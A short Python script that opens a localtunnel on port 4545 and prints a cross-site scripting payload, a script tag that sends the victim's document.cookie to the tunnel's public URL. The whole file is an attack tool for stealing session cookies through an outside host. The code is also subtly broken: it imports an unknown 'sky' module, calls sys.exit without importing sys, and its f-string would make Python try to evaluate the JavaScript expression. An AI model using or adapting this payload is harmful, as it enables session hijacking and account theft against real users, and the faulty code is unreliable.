import subprocess
import os
import time
import sky

def create_public_connection():
    file = "forward.txt"
    command = "lt --port 4545 > {} &".format(file)
    subprocess.Popen(command, shell=True)
    time.sleep(5)  # Wait a few seconds to ensure the tunnel is established

def get_public_url():
    ffile = "forward.txt"
    with open(ffile, 'r') as file:
        read_data = file.read()
    os.remove(ffile)
    new_data = read_data.split(' ')[1].strip()
    if new_data == "":
        print("Please restart.....")
        sys.exit()
    else:
        return new_data

def run():
    create_public_connection()
    public_url = get_public_url()
    print(f"public js query ::: <script>fetch(`{public_url}?cookies=${encodeURIComponent(document.cookie)}`);</script>")

if __name__ == '__main__':
    run()
